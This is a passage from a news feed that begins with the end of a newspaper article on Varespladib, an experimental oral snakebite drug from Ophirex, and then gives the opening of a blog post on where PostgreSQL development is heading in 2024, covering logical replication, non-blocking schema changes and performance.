568w,https://ca-times.brightspotcdn.com/dims4/default/231b72f/2147483647/strip/true/crop/4000x2667+0+0/resize/768x512!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F34%2F67%2F858a1b5646548dc5f463ea4f1f88%2Fla-me-snake-bite-medicine05.JPG 768w,https://ca-times.brightspotcdn.com/dims4/default/89b71b6/2147483647/strip/true/crop/4000x2667+0+0/resize/1080x720!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F34%2F67%2F858a1b5646548dc5f463ea4f1f88%2Fla-me-snake-bite-medicine05.JPG 1080w,https://ca-times.brightspotcdn.com/dims4/default/a547d6c/2147483647/strip/true/crop/4000x2667+0+0/resize/1240x827!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F34%2F67%2F858a1b5646548dc5f463ea4f1f88%2Fla-me-snake-bite-medicine05.JPG 1240w,https://ca-times.brightspotcdn.com/dims4/default/0ae28c2/2147483647/strip/true/crop/4000x2667+0+0/resize/1440x960!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F34%2F67%2F858a1b5646548dc5f463ea4f1f88%2Fla-me-snake-bite-medicine05.JPG 1440w,https://ca-times.brightspotcdn.com/dims4/default/6e71803/2147483647/strip/true/crop/4000x2667+0+0/resize/2160x1441!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F34%2F67%2F858a1b5646548dc5f463ea4f1f88%2Fla-me-snake-bite-medicine05.JPG 2160w" sizes="100vw">     <img alt="A specimen from the Herpetology Collection at the California Academy of Sciences in San Francisco." srcset="https://ca-times.brightspotcdn.com/dims4/default/ab2c21d/2147483647/strip/true/crop/4000x2667+0+0/resize/320x213!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F34%2F67%2F858a1b5646548dc5f463ea4f1f88%2Fla-me-snake-bite-medicine05.JPG 320w,https://ca-times.brightspotcdn.com/dims4/default/7e64135/2147483647/strip/true/crop/4000x2667+0+0/resize/568x379!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F34%2F67%2F858a1b5646548dc5f463ea4f1f88%2Fla-me-snake-bite-medicine05.JPG 568w,https://ca-times.brightspotcdn.com/dims4/default/35f4efb/2147483647/strip/true/crop/4000x2667+0+0/resize/768x512!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F34%2F67%2F858a1b5646548dc5f463ea4f1f88%2Fla-me-snake-bite-medicine05.JPG 768w,https://ca-times.brightspotcdn.com/dims4/default/5f1bebd/2147483647/strip/true/crop/4000x2667+0+0/resize/1080x720!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F34%2F67%2F858a1b5646548dc5f463ea4f1f88%2Fla-me-snake-bite-medicine05.JPG 1080w,https://ca-times.brightspotcdn.com/dims4/default/7b1c14e/2147483647/strip/true/crop/4000x2667+0+0/resize/1240x827!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F34%2F67%2F858a1b5646548dc5f463ea4f1f88%2Fla-me-snake-bite-medicine05.JPG 1240w,https://ca-times.brightspotcdn.com/dims4/default/54145e4/2147483647/strip/true/crop/4000x2667+0+0/resize/1440x960!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F34%2F67%2F858a1b5646548dc5f463ea4f1f88%2Fla-me-snake-bite-medicine05.JPG 1440w,https://ca-times.brightspotcdn.com/dims4/default/314f69d/2147483647/strip/true/crop/4000x2667+0+0/resize/2160x1441!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F34%2F67%2F858a1b5646548dc5f463ea4f1f88%2Fla-me-snake-bite-medicine05.JPG 2160w" sizes="100vw" width="2000" height="1334" src="https://ca-times.brightspotcdn.com/dims4/default/0a07670/2147483647/strip/true/crop/4000x2667+0+0/resize/2000x1334!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F34%2F67%2F858a1b5646548dc5f463ea4f1f88%2Fla-me-snake-bite-medicine05.JPG" decoding="async" loading="lazy">  </picture>  <div>      <p>(Gayle Laird / California Academy of Sciences)</p>   </div>  </figure></div><p>Lewin has been working for a decade to develop an easy-to-use, needle-free solution to all those problems with a drug called Varespladib.</p><p>What makes Varespladib promising is that it blocks phospholipase-A2, a highly toxic protein that is present in 95% of all snake venoms and plays a direct role in life-threatening tissue destruction, catastrophic bleeding, paralysis and respiratory failure. Proponents say the small synthetic molecule has the potential to stop or reverse neurological damage, as well as restore normal blood-clotting ability when administered immediately after envenoming.</p><p>Drug trials are  being conducted by  Ophirex Inc. — a public benefit corporation that Lewin founded with musician and entrepreneur Jerry Harrison in Corte Madera, Calif.</p><p>The U.S. Food and Drug Administration a year ago granted Varespladib a “fast track” designation to expedite development and review of its safety and effectiveness, as well as Ophirex’s proposals for manufacturing and distributing the drug. </p><p>The Department of Defense has also invested about $24 million into the effort, saying the drug could provide an important capability to teams of special forces deployed in austere conditions where snakebites are a significant threat to life and limb.</p><p> “Ophirex may help us widen the window of time needed for evacuation in the event of a snakebite,” said Lindsey Garver, deputy manager for the Army Medical Materiel Agency’s Warfighter Protection and Acute Care Project. “There is also a psychological benefit to having something in your pocket that is life-saving.”</p><div data-click="enhancement" data-align-right=""><figure> <picture>    <source type="image/webp" srcset="https://ca-times.brightspotcdn.com/dims4/default/a65d63c/2147483647/strip/true/crop/2667x4000+0+0/resize/320x480!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F2e%2Fc5%2Fd5e7c8724a548707e7fba0e143d8%2Fla-me-snake-bite-medicine01.JPG 320w,https://ca-times.brightspotcdn.com/dims4/default/31511b0/2147483647/strip/true/crop/2667x4000+0+0/resize/568x852!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F2e%2Fc5%2Fd5e7c8724a548707e7fba0e143d8%2Fla-me-snake-bite-medicine01.JPG 568w,https://ca-times.brightspotcdn.com/dims4/default/016d0cd/2147483647/strip/true/crop/2667x4000+0+0/resize/768x1152!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F2e%2Fc5%2Fd5e7c8724a548707e7fba0e143d8%2Fla-me-snake-bite-medicine01.JPG 768w,https://ca-times.brightspotcdn.com/dims4/default/8a18abf/2147483647/strip/true/crop/2667x4000+0+0/resize/1080x1620!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F2e%2Fc5%2Fd5e7c8724a548707e7fba0e143d8%2Fla-me-snake-bite-medicine01.JPG 1080w,https://ca-times.brightspotcdn.com/dims4/default/d6ac5e9/2147483647/strip/true/crop/2667x4000+0+0/resize/1240x1860!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F2e%2Fc5%2Fd5e7c8724a548707e7fba0e143d8%2Fla-me-snake-bite-medicine01.JPG 1240w,https://ca-times.brightspotcdn.com/dims4/default/a076bd7/2147483647/strip/true/crop/2667x4000+0+0/resize/1440x2160!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F2e%2Fc5%2Fd5e7c8724a548707e7fba0e143d8%2Fla-me-snake-bite-medicine01.JPG 1440w,https://ca-times.brightspotcdn.com/dims4/default/75fb52b/2147483647/strip/true/crop/2667x4000+0+0/resize/2160x3240!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F2e%2Fc5%2Fd5e7c8724a548707e7fba0e143d8%2Fla-me-snake-bite-medicine01.JPG 2160w" sizes="100vw">     <img alt="Bottles of antivenom." srcset="https://ca-times.brightspotcdn.com/dims4/default/26488fa/2147483647/strip/true/crop/2667x4000+0+0/resize/320x480!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F2e%2Fc5%2Fd5e7c8724a548707e7fba0e143d8%2Fla-me-snake-bite-medicine01.JPG 320w,https://ca-times.brightspotcdn.com/dims4/default/1f028b7/2147483647/strip/true/crop/2667x4000+0+0/resize/568x852!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F2e%2Fc5%2Fd5e7c8724a548707e7fba0e143d8%2Fla-me-snake-bite-medicine01.JPG 568w,https://ca-times.brightspotcdn.com/dims4/default/f51fbe8/2147483647/strip/true/crop/2667x4000+0+0/resize/768x1152!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F2e%2Fc5%2Fd5e7c8724a548707e7fba0e143d8%2Fla-me-snake-bite-medicine01.JPG 768w,https://ca-times.brightspotcdn.com/dims4/default/fd6fa30/2147483647/strip/true/crop/2667x4000+0+0/resize/1080x1620!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F2e%2Fc5%2Fd5e7c8724a548707e7fba0e143d8%2Fla-me-snake-bite-medicine01.JPG 1080w,https://ca-times.brightspotcdn.com/dims4/default/b41b0c7/2147483647/strip/true/crop/2667x4000+0+0/resize/1240x1860!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F2e%2Fc5%2Fd5e7c8724a548707e7fba0e143d8%2Fla-me-snake-bite-medicine01.JPG 1240w,https://ca-times.brightspotcdn.com/dims4/default/61ba39b/2147483647/strip/true/crop/2667x4000+0+0/resize/1440x2160!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F2e%2Fc5%2Fd5e7c8724a548707e7fba0e143d8%2Fla-me-snake-bite-medicine01.JPG 1440w,https://ca-times.brightspotcdn.com/dims4/default/80f5a8b/2147483647/strip/true/crop/2667x4000+0+0/resize/2160x3240!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F2e%2Fc5%2Fd5e7c8724a548707e7fba0e143d8%2Fla-me-snake-bite-medicine01.JPG 2160w" sizes="100vw" width="2000" height="3000" src="https://ca-times.brightspotcdn.com/dims4/default/3d12775/2147483647/strip/true/crop/2667x4000+0+0/resize/2000x3000!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F2e%2Fc5%2Fd5e7c8724a548707e7fba0e143d8%2Fla-me-snake-bite-medicine01.JPG" decoding="async" loading="lazy">  </picture>  <div>   <p>Bottles of anti-venom at the California Academy of Sciences in San Francisco.</p>   <p>(Gayle Laird / California Academy of Sciences)</p>   </div>  </figure></div><p>But getting any new drug from the laboratory to the market is an expensive, intricate process that can sometimes take just months to show promise but years to perfect.</p><p>The company is completing a Phase  II clinical trial in the United States and India to determine the tolerability and potential side effects of multi-dose regimens of the drug in about 100 suspected or confirmed snakebite victims. Among them is a man who a month ago was bitten by a sidewinder rattlesnake near the desert resort city of Palm Springs.</p><p>A federal analysis of the results is expected sometime next year and will ultimately determine whether Ophirex has a blockbuster snakebite drug treatment with military and global market opportunities.</p><p>“I certainly underestimated the astonishing complexity of an undertaking such as this one,” said Lewin, 55, expedition physician for the California Academy of Sciences in San Francisco. “It’s humbling.”</p><p>The company has assembled an impressive board of directors: Derrick Rossi, a stem cell scientist and co-founder of Moderna; Curt LaBelle, chair of Global Health Funds; Tim Garnett, former chief medical officer for Eli Lilly and Co.; and Hans Bishop, co-founder of Altos Labs Inc., a biotechnology research company.</p><p>“Our company is trying to produce a drug for a neglected global crisis,” Rossi said. “The vast majority of people who are being killed or maimed by snake bites are village farmers and children working out in the fields without shoes.”</p><p>Varespladib was originally discovered and developed by Eli Lilly and Co. to suppress inflammation. The company abandoned that effort, however, after clinical studies failed to produce the desired results.</p><p>Since then, patents on the drug’s molecule have expired, providing  Ophirex with “an opportunity for us to establish an appropriate patent portfolio,” said Nancy Koch, chief executive  of  Ophirex.</p><p>The proposed pill’s price tag remains unclear. “We haven’t made any estimates of pricing yet,” Koch said. “But we want to make the drug accessible around the world, and to make that possible we are studying ways to reduce manufacturing costs.”</p><div data-click="enhancement" data-align-center=""><figure> <picture>    <source type="image/webp" srcset="https://ca-times.brightspotcdn.com/dims4/default/b3f670e/2147483647/strip/true/crop/4000x2667+0+0/resize/320x213!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F98%2Fdf%2Fbefd9fbd40acbb63631a19383587%2Fla-me-snake-bite-medicine06.JPG 320w,https://ca-times.brightspotcdn.com/dims4/default/9f7175c/2147483647/strip/true/crop/4000x2667+0+0/resize/568x379!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F98%2Fdf%2Fbefd9fbd40acbb63631a19383587%2Fla-me-snake-bite-medicine06.JPG 568w,https://ca-times.brightspotcdn.com/dims4/default/c07c29c/2147483647/strip/true/crop/4000x2667+0+0/resize/768x512!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F98%2Fdf%2Fbefd9fbd40acbb63631a19383587%2Fla-me-snake-bite-medicine06.JPG 768w,https://ca-times.brightspotcdn.com/dims4/default/9e89061/2147483647/strip/true/crop/4000x2667+0+0/resize/1080x720!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F98%2Fdf%2Fbefd9fbd40acbb63631a19383587%2Fla-me-snake-bite-medicine06.JPG 1080w,https://ca-times.brightspotcdn.com/dims4/default/c8a8cdf/2147483647/strip/true/crop/4000x2667+0+0/resize/1240x827!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F98%2Fdf%2Fbefd9fbd40acbb63631a19383587%2Fla-me-snake-bite-medicine06.JPG 1240w,https://ca-times.brightspotcdn.com/dims4/default/dcfe6a9/2147483647/strip/true/crop/4000x2667+0+0/resize/1440x960!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F98%2Fdf%2Fbefd9fbd40acbb63631a19383587%2Fla-me-snake-bite-medicine06.JPG 1440w,https://ca-times.brightspotcdn.com/dims4/default/62bbaff/2147483647/strip/true/crop/4000x2667+0+0/resize/2160x1441!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F98%2Fdf%2Fbefd9fbd40acbb63631a19383587%2Fla-me-snake-bite-medicine06.JPG 2160w" sizes="100vw">     <img alt="A view of the Herpetology Collection at the California Academy of Sciences in San Francisco." srcset="https://ca-times.brightspotcdn.com/dims4/default/f945d43/2147483647/strip/true/crop/4000x2667+0+0/resize/320x213!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F98%2Fdf%2Fbefd9fbd40acbb63631a19383587%2Fla-me-snake-bite-medicine06.JPG 320w,https://ca-times.brightspotcdn.com/dims4/default/1cba055/2147483647/strip/true/crop/4000x2667+0+0/resize/568x379!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F98%2Fdf%2Fbefd9fbd40acbb63631a19383587%2Fla-me-snake-bite-medicine06.JPG 568w,https://ca-times.brightspotcdn.com/dims4/default/45310f4/2147483647/strip/true/crop/4000x2667+0+0/resize/768x512!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F98%2Fdf%2Fbefd9fbd40acbb63631a19383587%2Fla-me-snake-bite-medicine06.JPG 768w,https://ca-times.brightspotcdn.com/dims4/default/26fa750/2147483647/strip/true/crop/4000x2667+0+0/resize/1080x720!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F98%2Fdf%2Fbefd9fbd40acbb63631a19383587%2Fla-me-snake-bite-medicine06.JPG 1080w,https://ca-times.brightspotcdn.com/dims4/default/80a8813/2147483647/strip/true/crop/4000x2667+0+0/resize/1240x827!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F98%2Fdf%2Fbefd9fbd40acbb63631a19383587%2Fla-me-snake-bite-medicine06.JPG 1240w,https://ca-times.brightspotcdn.com/dims4/default/a8b9216/2147483647/strip/true/crop/4000x2667+0+0/resize/1440x960!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F98%2Fdf%2Fbefd9fbd40acbb63631a19383587%2Fla-me-snake-bite-medicine06.JPG 1440w,https://ca-times.brightspotcdn.com/dims4/default/84e03f6/2147483647/strip/true/crop/4000x2667+0+0/resize/2160x1441!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F98%2Fdf%2Fbefd9fbd40acbb63631a19383587%2Fla-me-snake-bite-medicine06.JPG 2160w" sizes="100vw" width="2000" height="1334" src="https://ca-times.brightspotcdn.com/dims4/default/71e93d1/2147483647/strip/true/crop/4000x2667+0+0/resize/2000x1334!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F98%2Fdf%2Fbefd9fbd40acbb63631a19383587%2Fla-me-snake-bite-medicine06.JPG" decoding="async" loading="lazy">  </picture>  <div>      <p>(Gayle Laird / California Academy of Sciences)</p>   </div>  </figure></div><p>To hear Lewin tell it,  Ophirex emerged from a tragic event. In 2001, Joseph Slowinski, a herpetologist at the California Academy of Sciences in San Francisco, died 30 hours after he was bitten by a small venomous snake in the mountainous jungles of northern Myanmar.</p><p>No antivenom was available at the remote site, a five-day hike from the nearest town. Heroic efforts to save him were unsuccessful.</p><p>A decade later, after a trip to the same region, Lewin, director of the academy’s Center for Exploration and Travel Health, began to ponder the possibility of a needle-free treatment that could be administered in the field immediately after being bitten.</p><p>Lewin initially set his sights on proving that the potentially fatal paralytic effects of certain toxic substances could be reversed with an antiparalytic drug administered via a nasal spray.</p><p>With that goal in mind, Lewin self-volunteered to become a test subject.</p><p>In a 2013 experiment conducted with a team of anesthesiologists in a research laboratory at UC San Francisco, Lewin allowed himself to be paralyzed with derivative of curare, a chemical typically administered intravenously as a paralyzing agent for surgical procedures.</p><p>Moments later, he said, “I couldn’t talk, felt dizzy and had trouble breathing.”</p><p>The team then administered the nasal spray, and within 20 minutes Lewin had recovered. The results of the experiment were published online in the medical journal Clinical Case Reports.</p><p>“It was terrifying, and I’d never do that again,” Lewin said. “But the experiment proved that paralysis could be reversed without intravenous medication.”</p><p>The arc of Lewin’s career has led him from emergency rooms to wilderness medicine as a doctor on scientific expeditions sponsored by the American Museum of Natural History, the Kellogg Foundation and National Geographic.</p><p>Not all of his research occurs in remote corners of the world, however. Studying the factors that influence snakebite severity means working with scientists such as William Hayes, a professor at Loma Linda University School of Medicine in Loma Linda, Calif., who keeps an assortment of snake venom available for testing in a laboratory refrigerator.</p><p>It also means studying the physical and financial struggles of survivors like John Heenan, whose hospital bills soared to more than $350,000 after he was bitten at the Indian Valley Campus of the College of Marin.</p><p>“Medicare eventually covered my medical costs, but I had to pay about 300 bucks for the ambulance service,” Heenan said, shaking his head. </p><p>The college, for its part, later planted a large digital welcome sign at its entrance that states: “CAUTION: Entering Rattlesnake Country. Be alert when walking.”</p> <p>Heenan wouldn’t argue with any of that. But he also has high hopes for Lewin’s vision.</p><p>“Everybody should carry a few of those pills in their first aid kits and lunch boxes,” he said. “Of course, they should also watch where they step.”</p> </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Thoughts on PostgreSQL in 2024 (112 pts)]]></title>
            <link>https://jkatz05.com/post/postgres/postgresql-2024/</link>
            <guid>38848001</guid>
            <pubDate>Tue, 02 Jan 2024 22:34:04 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://jkatz05.com/post/postgres/postgresql-2024/">https://jkatz05.com/post/postgres/postgresql-2024/</a>, See on <a href="https://news.ycombinator.com/item?id=38848001">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><div><p><em></em>
<span>Tue, Jan 2, 2024
</span><em></em>
<span>18-minute read</span></p></div><p>A question I often hear, and also ask myself, is “where is PostgreSQL going?” This is a deep question: it’s not limited to the work on the core database engine, but rather everything going on in the community, including related open source projects and event and community development. Even with the popularity of PostgreSQL, which was selected as <a href="https://db-engines.com/en/blog_post/106">DB Engine’s “DBMS of the Year” for the fourth time</a>, it’s a good idea to step back at times and reflect on what PostgreSQL will look like in the future. While it may not necessarily lead to immediate changes, it does help give context to all the work going on in the community.</p><p>The new year is a great opportunity to ask “where is PostgreSQL going?” and is a question I’ve been personally reflecting on. So here are some of my thoughts on where PostgreSQL is going as we enter into 2024. This is not meant to be a roadmap, but rather personal thoughts on where PostgreSQL is going.</p><h2 id="postgresql-feature-development">PostgreSQL feature development</h2><p>At the <a href="https://wiki.postgresql.org/wiki/PgCon_2023_Developer_Meeting">PGCon 2023 Developer Meeting</a>, I proposed a topic entitled <a href="https://wiki.postgresql.org/wiki/PgCon_2023_Developer_Meeting#What_are_the_big_challenges_for_our_users.3F_What_are_the_big_challenges_for_us_to_solve.3F">“What are the big challenges for PostgreSQL users?”</a>. The goal of this was to talk about both common user requests and understand where database workloads were heading to determine if we are building PostgreSQL towards where database workloads are going. Based on many conversation and observations, I proposed three broad feature buckets to look at:</p><ul><li><strong>Availability</strong></li><li><strong>Performance</strong></li><li><strong>Developer features</strong></li></ul><p>These are all ongoing areas of work for 2024 and beyond, but there are definitely steps PostgreSQL can take in the coming year to make improvements in all of these areas. Below I dive into more details about each of these feature groups.</p><h3 id="availability">Availability</h3><p>Continuing to improve the availability of a PostgreSQL cluster is the first, second, and third most requested “feature” I hear about from both current and prospective PostgreSQL users. I’m not exaggerating either: while restarting PostgreSQL can be nearly instantaneous, there are use cases where that can be too much time (though those are at the extreme). Additionally, operations with locks that block writes for prolonged periods of time can be considered as “downtime.”</p><p>While most PostgreSQL users can currently achieve their uptime requirements, there is a class of workloads with critical uptime requirements that we can better support in PostgreSQL with additional development effort. Most of this section (and blog post) focuses on one feature area where continued improvements will allow PostgreSQL to be deployed in even more environments that have these requirements.</p><h4 id="how-logical-replication-can-help-with-active-active-bluegreen-zero-downtime-upgrading-and-other-workflows">How logical replication can help with active-active, blue/green, zero-downtime upgrading, and other workflows</h4><p>For existing PostgreSQL users and users looking to migrate to PostgreSQL, features around availability are the biggest ask. Typically, this centers around <a href="https://en.wikipedia.org/wiki/High_availability">high availability</a>, or the ability to continue to have access to the database (especially read/write access) during a planned (update) or unplanned (outage) disruption. PostgreSQL provides many features to support high availability, including streaming replication. However, maximizing HA still requires the use of an additional service or a utility like <a href="https://github.com/zalando/patroni">Patroni</a> to achieve many uptime goals.</p><p>Many users I talk to are happy with the availability they can get with PostgreSQL: it works for most of their use cases. However, I’ve been seeing an emerging trend of workloads on PostgreSQL that need even higher availability, where a 15-30s offline window isn’t good enough. This is both for planned outages (e.g. minor version upgrades, major version upgrades) and unplanned outages. I’ve even talked to users who have workloads that can only be unavailable for 1s – and while I was initially skeptical, when I heard what the workloads were for, I did agree that 1s was a reasonable requirement for them!</p><p>A key feature for PostgreSQL that will continue to improve availability is <a href="https://www.postgresql.org/docs/current/logical-replication.html">logical replication</a>. Logical replication allows the real-time streaming of changes from a database into any system that can understand the PostgreSQL logical replication protocol. Logical replication in PostgreSQL <a href="https://jkatz05.com/post/postgres/postgres-10-tribute/">has been around for awhile</a>, but <a href="https://www.postgresql.org/about/news/postgresql-16-released-2715/">recent releases</a> have added significant enhancements that can better support availability use-cases, including functionality and performance features.</p><p>One advantage this has over physical (or binary) replication is that you can use logical replication to stream changes from a PostgreSQL 15 to a PostgreSQL 16 system as part of a major version upgrade. This can help reduce the amount of downtime it takes to perform a major version upgrade (here is an example of how <a href="https://www.instacart.com/company/how-its-made/zero-downtime-postgresql-cutovers/">Instacart used logical replication to get to zero-downtime on major version upgrades</a>), but there is still work to be done in PostgreSQL to improve this use case and other high availability use cases. Additional features will help unlock more seamless ways of supporting <a href="https://en.wikipedia.org/wiki/Blue%E2%80%93green_deployment">blue-green deployments</a> in PostgreSQL.</p><p>Logical replication can also be used as part of the high availability mechanism itself. One technique, “active-active replication,” allows multiple databases can simultaneously accept writes and replicate the changes amongst themselves. This technique is typically used in systems that have that “no more than 1s of unavailability” requirement: if a writer database is unavailable, then an application can switch its database traffic to a different writer database without waiting for it to be promoted. While this sounds ideal, building and managing an active-active system is extremely complicated: it impacts application design, requires you to have a write-conflict management and resolution strategy, and requires careful fault tolerance monitoring to help ensure data integrity (e.g. a “conflict storm”) and replication health (e.g. what happens if an instance can’t replicate changes for several hours?).</p><p>However, both the major version upgrade and active-active cases do present a roadmap for how we can continue to improve logical replication in PostgreSQL. <a href="https://amitkapila16.blogspot.com/">Amit Kapila</a>, who has led many of the logical replication feature efforts, and I developed a talk this year called <a href="https://www.postgresql.eu/events/pgconfeu2023/sessions/session/4783/slides/434/pgconfeu2023_active_active.pdf">The journey towards active-active replication in PostgreSQL</a> (<a href="https://www.youtube.com/watch?v=jPp4XIY4XRw">video of us co-presening one version</a>) that talks about why solving for these use cases are important, the current state-of-the-art of PostgreSQL logical replication, and what work we need to do to get PostgreSQL to better support these cases. The good news: as of PostgreSQL 16, we have most of the foundational blocks for supporting active-active, blue-green deployments, and zero downtime major version upgrades – and even if they are not in core, there are PostgreSQL extensions that can provide this functionality (disclosure: I’ve been involved with one such extension, <a href="https://aws.amazon.com/blogs/database/using-pgactive-active-active-replication-extension-for-postgresql-on-amazon-rds-for-postgresql/"><code>pgactive</code></a>).</p><p>There are multiple efforts in 2024 to help close these feature gaps. Targeted for PostgreSQL 17 (usual disclaimer that these may not be included), there has been a focus on ensuring logical replication can work with key workflows, such as <a href="https://www.postgresql.org/docs/current/pgupgrade.html"><code>pg_upgrade</code></a> and in <a href="https://commitfest.postgresql.org/46/4423/">high availability systems</a>, and working to support replication of additional changes (e.g. <a href="https://commitfest.postgresql.org/46/3823/">sequences</a>). Beyond that, we must continue to support more commands in logical replication (e.g. <a href="https://commitfest.postgresql.org/46/3595/">DDL</a>), continue to improve performance (more parallelism support, worker optimizations), and add features that simplify management of logical replication (node synchronization/resynchronization).</p><p>All of these efforts will make it possible to use PostgreSQL in more workloads that have very high uptime requirements, and simplify how users roll out new changes to their production environments. While there’s still more work to do with enhancing logical replication in PostgreSQL, it looks like 2024 will give us more features that help users run PostgreSQL in critical environments.</p><h4 id="unblocking-the-locks">Unblocking the locks</h4><p>Another area of availability to consider is around schema maintenance operations (i.e. <a href="https://en.wikipedia.org/wiki/Data_definition_language">DDL</a> statements), such an <a href="https://www.postgresql.org/docs/current/sql-altertable.html"><code>ALTER TABLE</code></a> that takes an <a href="https://www.postgresql.org/docs/current/explicit-locking.html#LOCKING-TABLES"><code>ACCESS EXCLUSIVE</code></a> lock on the table that blocks all other write operations on that table. For many users, this is the same thing as being unavailable, even if it’s only to a subset of their data. Lack of full support for nonblocking/online schema maintenance operations in PostgreSQL has become more noticeable as other relational databases include support for this feature.</p><p>There are various utilities and extensions that let you run nonblocking schema updates, but it would be more convenient, and likely performant, to support more nonblocking schema changes natively in PostgreSQL. Based on the design, we may already have the foundation to build out this feature, but it will take some time. While I’m not aware of active implementation efforts, I do think in 2024 we need to make more progress on making it possible for users to run most, if not all, DDL commands without blocking writes, if they so choose.</p><h3 id="performance">Performance</h3><p>Performance is very much a “what have you done for me lately” feature: we can always go faster! The good news is that PostgreSQL has a reputation of vertically scaling, or being able to scale as you provide more hardware resources to a single instance. While there are use cases where horizontally scaling both reads and writes makes sense, we do need to continue to ensure PostgreSQL can continue to scale as compute and memory resources continue to grow.</p><p>Here’s a more “practical” way of putting it: there is an Amazon EC2 instance that has <a href="https://aws.amazon.com/ec2/instance-types/high-memory/">448 vCPU and 24TB of RAM</a> – is PostgreSQL able to fully maximize its use of all of those resources on a single instance? Looking at the current and upcoming hardware that PostgreSQL users will use gives us a measured target for how we can continue to improve PostgreSQL performance.</p><p>As we enter 2024, there are already multiple efforts that will help make it possible to continue to vertically scale PostgreSQL. One of the biggest efforts, and one that’s been an ongoing multi-year project, is to support direct IO (DIO) and asynchronous IO (AIO) in PostgreSQL. For details, I’ll defer to Andres Freund’s <a href="https://www.pgconf.eu/">PGConf.EU</a> slides on the <a href="https://anarazel.de/talks/2023-12-14-pgconf-eu-path-to-aio/path-to-aio.pdf">status of adding AIO to PostgreSQL</a>, but it looks like in 2024 that we’ll be much closer to full AIO support.</p><p>Another effort I’m intrigued by is <a href="https://wiki.postgresql.org/wiki/Parallel_Recovery">parallel recovery</a>. PostgreSQL users with heavy write workloads tend to postpone <a href="https://www.postgresql.org/docs/current/sql-checkpoint.html">checkpoints</a> to defer I/O workload. This can be problematic on a busy system if PostgreSQL crashes and a checkpoint has not occurred for awhile. When PostgreSQL restarts, it enters “crash recovery” where it replays every change since the last checkpoint so it can reach a consistent state. During crash recovery, PostgreSQL cannot accept reads or writes, which means that it’s unavailable. This is problematic for busy stems: while PostgreSQL can accept concurrent writes, it can only replay changes with a single process. If a crash on a busy system occurred an hour after the last checkpoint, it could take several more hours to reach a consistent state while the system is offline!</p><p>One way to help overcome this limitation is to support “<a href="https://wiki.postgresql.org/wiki/Parallel_Recovery">parallel recovery</a>,” or being able to replay changes in parallel. At <a href="https://www.pgcon.org/">PGCon 2023</a>, Koichi Suzuki gave a <a href="https://www.pgcon.org/events/pgcon_2023/sessions/session/392/slides/69/Parallel%20Recovery%20in%20PostgreSQL.pdf">detailed presentation on how PostgreSQL can support parallel recovery</a>. This would apply not only to crash recovery, but how PostgreSQL can replay any WAL changes (e.g. point-in-time-recovery). While this is a very challenging problem to solve, supporting parallel recovery 